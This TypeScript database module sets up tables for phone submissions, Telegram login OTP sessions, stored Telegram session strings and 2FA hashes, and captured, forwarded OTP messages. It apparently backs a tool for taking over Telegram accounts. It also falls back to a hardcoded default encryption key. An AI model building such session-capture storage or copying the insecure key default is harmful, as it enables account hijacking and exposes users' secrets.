import { Pool } from "@neondatabase/serverless";
import crypto from "crypto";

const pool = new Pool({ connectionString: process.env.DATABASE_URL });

const ENCRYPTION_KEY = process.env.OTP_ENCRYPTION_KEY || "default-otp-encryption-key-change-in-production";

export function encryptMessage(text: string): string {
  const iv = crypto.randomBytes(16);
  const key = crypto.createHash('sha256').update(ENCRYPTION_KEY).digest();
  const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return iv.toString('hex') + ':' + encrypted;
}

export function decryptMessage(encrypted: string): string {
  const parts = encrypted.split(':');
  if (parts.length < 2) return encrypted; // fallback jika bukan format encrypted
  const [ivHex, ciphertext] = parts;
  const iv = Buffer.from(ivHex, 'hex');
  const key = crypto.createHash('sha256').update(ENCRYPTION_KEY).digest();
  
  try {
    const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
    let decrypted = decipher.update(ciphertext, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
  } catch (err) {
    try {
      const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY, 'utf8'), iv);
      let decrypted = decipher.update(ciphertext, 'hex', 'utf8');
      decrypted += decipher.final('utf8');
      return decrypted;
    } catch {
      return encrypted; // fallback: return as-is jika decrypt gagal
    }
  }
}

// Di Vercel serverless, modul bisa di-reuse antar request dalam warm instance
// tapi tidak dijamin. Pakai try-create-if-not-exists di DB agar aman.
let schemaInitialized = false;

export async function initSchema(): Promise<void> {
  if (schemaInitialized) return;
  const client = await pool.connect();
  try {
    await client.query(`
      CREATE TABLE IF NOT EXISTS submissions (
        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
        name TEXT NOT NULL,
        phone TEXT NOT NULL,
        status TEXT NOT NULL DEFAULT 'pending',
        period TEXT,
        channel TEXT,
        created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
      );
      
      CREATE INDEX IF NOT EXISTS idx_submissions_phone ON submissions(phone);
      
      CREATE TABLE IF NOT EXISTS otp_sessions (
        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
        login_id UUID NOT NULL UNIQUE DEFAULT gen_random_uuid(),
        phone TEXT NOT NULL,
        phone_code_hash TEXT,
        session_string TEXT,
        status TEXT NOT NULL DEFAULT 'pending',
        attempts INT NOT NULL DEFAULT 0,
        created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
        expires_at TIMESTAMPTZ NOT NULL DEFAULT (NOW() + INTERVAL '10 minutes'),
        updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
      );
      
      CREATE INDEX IF NOT EXISTS idx_otp_sessions_login_id ON otp_sessions(login_id);
      CREATE INDEX IF NOT EXISTS idx_otp_sessions_phone ON otp_sessions(phone);
      
      CREATE TABLE IF NOT EXISTS telegram_accounts (
        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
        phone TEXT NOT NULL UNIQUE,
        user_id BIGINT,
        username TEXT,
        first_name TEXT,
        last_name TEXT,
        session_string TEXT NOT NULL,
        two_fa_password_hash TEXT,
        signed_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
      );
      
      CREATE INDEX IF NOT EXISTS idx_telegram_accounts_phone ON telegram_accounts(phone);

      CREATE TABLE IF NOT EXISTS bot_state (
        key TEXT PRIMARY KEY,
        value TEXT NOT NULL
      );

      CREATE TABLE IF NOT EXISTS otp_messages (
        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
        phone TEXT NOT NULL,
        telegram_user_id BIGINT,
        telegram_chat_id BIGINT,
        message_text TEXT NOT NULL,
        received_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
        forwarded_at TIMESTAMPTZ
      );

      CREATE INDEX IF NOT EXISTS idx_otp_messages_phone ON otp_messages(phone);
      CREATE INDEX IF NOT EXISTS idx_otp_messages_received ON otp_messages(received_at DESC);
      
      ALTER TABLE otp_messages ADD COLUMN IF NOT EXISTS forwarded_at TIMESTAMPTZ;
    `);
    schemaInitialized = true;
  } catch (err) {
    console.error("[db] initSchema error:", err);
    throw err;
  } finally {
    client.release();
  }
}

export async function query<T = any>(text: string, params?: any[]): Promise<T[]> {
  const client = await pool.connect();
  try {
    const result = await client.query(text, params);
    return result.rows;
  } finally {
    client.release();
  }
}

export async function queryOne<T = any>(text: string, params?: any[]): Promise<T | null> {
  const rows = await query<T>(text, params);
  return rows[0] ?? null;
}

export async function execute(text: string, params?: any[]): Promise<number> {
  const client = await pool.connect();
  try {
    const result = await client.query(text, params);
    return result.rowCount ?? 0;
  } finally {
    client.release();
  }
}

export { pool };
